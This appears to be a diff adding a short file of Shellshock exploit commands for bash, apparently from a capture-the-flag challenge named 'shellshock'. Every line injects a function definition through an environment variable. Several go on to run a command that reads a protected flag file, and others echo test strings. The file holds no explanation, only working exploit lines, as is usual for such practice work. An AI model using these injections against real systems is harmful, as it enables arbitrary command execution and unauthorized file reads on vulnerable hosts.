@@ -1,0 +1,13 @@
+env x='() { :;}; echo vulnerable' bash -c "echo this is a test "
+
+env x='() { :;}; echo vulnerable' bash -c ./shellshock
+
+env x="() { :;}; alias echo='cat /home/shellshock/flag'" ./bash -c ./shellshock
+
+env x="() { :;}; echo 'nihao hahhahha hahe'" ./bash -c "echo this is a test "
+
+
+env x="() { :;}; alias pxx='echo woshishui'" ./bash -c "alias;pxx"
+
+
+env x='() { :;}; /bin/cat /home/shellshock/flag' bash -c ./shellshock
